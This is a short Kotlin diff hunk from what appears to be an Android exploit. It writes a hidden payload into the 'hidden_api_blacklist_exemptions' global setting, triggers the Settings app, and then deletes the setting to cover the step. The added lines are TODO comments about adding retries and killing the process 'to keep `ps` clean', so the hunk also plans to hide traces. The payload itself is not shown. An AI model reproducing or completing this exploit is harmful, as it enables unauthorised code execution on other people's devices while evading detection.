@@ -26,12 +26,15 @@ fun launch(context: Context) {
         Log.w(TAG, "Setting payload: $payload")
         Settings.Global.putString(context.contentResolver, "hidden_api_blacklist_exemptions", payload)
 
+        // TODO: Add retries
         Log.w(TAG, "Payload set")
         startSettings(context)
 
         context.contentResolver.delete(EXEMPTIONS_SETTING_URI, null, null)
 
         Log.w(TAG, "Trampoline complete")
+
+        // TODO: Kill process after delay (to keep `ps` clean)
     } catch (e: Exception) {
         Log.e(TAG, "Exploit error: ${e.message}")
     }
